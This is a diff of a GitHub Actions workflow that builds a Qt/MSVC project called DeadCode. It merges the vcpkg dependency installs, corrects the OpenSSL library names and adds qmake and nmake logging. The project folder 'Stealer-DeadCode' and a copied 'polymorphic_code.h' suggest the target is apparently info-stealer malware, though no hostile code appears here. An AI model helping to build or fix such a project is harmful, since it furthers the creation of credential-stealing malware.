@@ -6,7 +6,8 @@
 # Убрано указание версии openssl@3.3.2, так как текущая версия vcpkg не поддерживает такой синтаксис.
 # Обновлен vcpkg до последней версии, добавлено перенаправление вывода для отладки.
 # Добавлен флаг --debug и отдельная установка openssl для отладки.
-# Исправлены имена библиотек в Verify vcpkg installation (ssl.lib -> libssl.lib, crypto.lib -> libcrypto.lib).
+# Исправлены имена библиотек OpenSSL в проверке (libssl.lib и libcrypto.lib вместо ssl.lib и crypto.lib).
+# Добавлено перенаправление вывода nmake для отладки ошибок компиляции.
 
 name: Build DeadCode
 
@@ -167,20 +168,10 @@ jobs:
         & $vcpkgExe remove --outdated --recurse
         Write-Host "Clearing vcpkg buildtrees..."
         Remove-Item -Path "C:/vcpkg/buildtrees" -Recurse -Force -ErrorAction SilentlyContinue
-        Write-Host "Installing vcpkg dependencies (excluding openssl) with triplet x64-windows-static..."
-        & $vcpkgExe install sqlite3 libzip zlib bzip2 --triplet x64-windows-static --clean-after-build 2>&1 | Tee-Object -FilePath "vcpkg_install.log"
+        Write-Host "Installing vcpkg dependencies with triplet x64-windows-static..."
+        & $vcpkgExe install sqlite3 libzip zlib bzip2 openssl --triplet x64-windows-static --clean-after-build 2>&1 | Tee-Object -FilePath "vcpkg_install.log"
         if ($LASTEXITCODE -ne 0) {
-          Write-Host "Error: vcpkg install failed for dependencies excluding openssl. Check the logs for details."
-          if (Test-Path vcpkg_install.log) {
-            Write-Host "Contents of vcpkg_install.log:"
-            Get-Content vcpkg_install.log
-          }
-          exit 1
-        }
-        Write-Host "Installing openssl separately for debugging..."
-        & $vcpkgExe install openssl --triplet x64-windows-static --clean-after-build --debug 2>&1 | Tee-Object -FilePath "openssl_install.log"
-        if ($LASTEXITCODE -ne 0) {
-          Write-Host "Error: vcpkg install failed for openssl. Check the logs for details."
+          Write-Host "Error: vcpkg install failed. Check the logs for details."
           dir C:/vcpkg/installed/x64-windows-static/lib
           Write-Host "Printing vcpkg logs..."
           dir C:/vcpkg/buildtrees/openssl
@@ -192,9 +183,9 @@ jobs:
             Write-Host "Contents of install-x64-windows-static-rel-out.log:"
             Get-Content C:/vcpkg/buildtrees/openssl/install-x64-windows-static-rel-out.log
           }
-          if (Test-Path openssl_install.log) {
-            Write-Host "Contents of openssl_install.log:"
-            Get-Content openssl_install.log
+          if (Test-Path vcpkg_install.log) {
+            Write-Host "Contents of vcpkg_install.log:"
+            Get-Content vcpkg_install.log
           }
           exit 1
         }
@@ -212,18 +203,17 @@ jobs:
           C:/vcpkg/buildtrees/openssl/install-x64-windows-static-rel-err.log
           C:/vcpkg/buildtrees/openssl/install-x64-windows-static-rel-out.log
           vcpkg_install.log
-          openssl_install.log
         if-no-files-found: warn
 
     - name: Verify vcpkg installation
       run: |
         $libDir = "C:/vcpkg/installed/x64-windows-static/lib"
         $includeDir = "C:/vcpkg/installed/x64-windows-static/include"
-        $libs = @("sqlite3", "zip", "zlib", "bz2", "libssl", "libcrypto") # Исправлены имена для openssl
+        $libs = @("sqlite3", "zip", "zlib", "bz2", "libssl", "libcrypto")
         $headers = @("sqlite3.h", "zip.h", "zlib.h", "bzlib.h", "openssl/ssl.h", "openssl/crypto.h")
         $missing = @()
         foreach ($lib in $libs) {
-          if (-not (Test-Path "$libDir/$lib.lib")) { # MSVC использует .lib
+          if (-not (Test-Path "$libDir/$lib.lib")) { # MSVC использует .lib, а не .a
             $missing += "$lib.lib"
           }
         }
@@ -238,11 +228,8 @@ jobs:
           dir ${libDir}
           Write-Host "Contents of directory ${includeDir}:"
           dir ${includeDir}
-          # Дополнительно выводим содержимое директории openssl для отладки
-          if (Test-Path "$includeDir/openssl") {
-            Write-Host "Contents of directory ${includeDir}/openssl:"
-            dir "$includeDir/openssl"
-          }
+          Write-Host "Contents of directory ${includeDir}/openssl:"
+          dir ${includeDir}/openssl
           exit 1
         }
         Write-Host "All vcpkg dependencies verified"
@@ -321,12 +308,26 @@ jobs:
         $env:Path = "$qtBinPath;" + $env:Path
         $env:INCLUDE = "C:/vcpkg/installed/x64-windows-static/include;" + $env:INCLUDE
         $env:LIB = "C:/vcpkg/installed/x64-windows-static/lib;" + $env:LIB
-        & $qmakePath -spec win32-msvc ui/DeadCode.pro -o Makefile
+        Write-Host "INCLUDE path: $env:INCLUDE"
+        Write-Host "LIB path: $env:LIB"
+        & $qmakePath -spec win32-msvc ui/DeadCode.pro -o Makefile 2>&1 | Tee-Object -FilePath "qmake_output.log"
         if (-not (Test-Path Makefile)) {
           Write-Host "Error: Makefile was not generated"
+          if (Test-Path qmake_output.log) {
+            Write-Host "Contents of qmake_output.log:"
+            Get-Content qmake_output.log
+          }
           exit 1
         }
-        & nmake -f Makefile.Release
+        & nmake -f Makefile.Release /VERBOSE 2>&1 | Tee-Object -FilePath "nmake_output.log"
+        if ($LASTEXITCODE -ne 0) {
+          Write-Host "Error: nmake failed. Check the logs for details."
+          if (Test-Path nmake_output.log) {
+            Write-Host "Contents of nmake_output.log:"
+            Get-Content nmake_output.log
+          }
+          exit 1
+        }
         if (-not (Test-Path ../build/DeadCode.exe)) {
           Write-Host "Error: DeadCode.exe was not created"
           dir ../build
@@ -345,6 +346,16 @@ jobs:
           Write-Host "polymorphic_code.h copied to build directory"
         }
       shell: powershell
+
+    - name: Upload build logs
+      if: failure()
+      uses: actions/upload-artifact@v4
+      with:
+        name: build-logs
+        path: |
+          Stealer-DeadCode/qmake_output.log
+          Stealer-DeadCode/nmake_output.log
+        if-no-files-found: warn
 
     - name: Upload artifact
       uses: actions/upload-artifact@v4
